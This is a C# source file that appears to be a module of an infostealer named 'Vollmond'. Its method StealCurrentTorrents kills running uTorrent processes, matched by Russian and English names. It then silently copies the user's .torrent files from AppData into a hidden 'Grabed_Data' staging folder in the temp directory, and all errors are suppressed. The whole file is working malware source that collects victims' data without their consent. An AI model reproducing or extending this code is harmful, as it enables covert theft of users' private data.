using System.Diagnostics;

namespace Vollmond
{
    internal class UTorrent
    {
        public static void StealCurrentTorrents()
        {
            string UTorrent_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "utorrent");
            string data_path = Path.Combine(Path.GetTempPath(), "Grabed_Data", "UTorrent", "Current Torrents");

            try
            {
                if (Directory.Exists(UTorrent_path))
                {
                    KillUtorrentProcesses();
                    Directory.CreateDirectory(data_path);

                    string[] files = Directory.GetFiles(UTorrent_path);

                    foreach (string file in files)
                    {
                        if (file.EndsWith(".torrent"))
                        {
                            File.Copy(file, Path.Combine(data_path, Path.GetFileName(file)));
                        }
                    }
                }
            }
            catch { }
        }

        private static void KillUtorrentProcesses()
        {
            Process[] proceses_x32_ru = Process.GetProcessesByName("uTorrent  (32 бита)");
            Process[] proceses_x64_ru = Process.GetProcessesByName("uTorrent  (64 бита)");

            Process[] proceses_x32_en = Process.GetProcessesByName("uTorrent (32 - bit)");
            Process[] proceses_x64_en = Process.GetProcessesByName("uTorrent (64 - bit)");

            Kill(proceses_x64_en);
            Kill(proceses_x32_ru);
            Kill(proceses_x32_en);
            Kill(proceses_x64_ru);
        }

        private static void Kill(Process[] processes)
        {
            foreach (Process process in processes)
            {
                process.Kill(true);
                process.WaitForExit();
            }
        }
    }
}
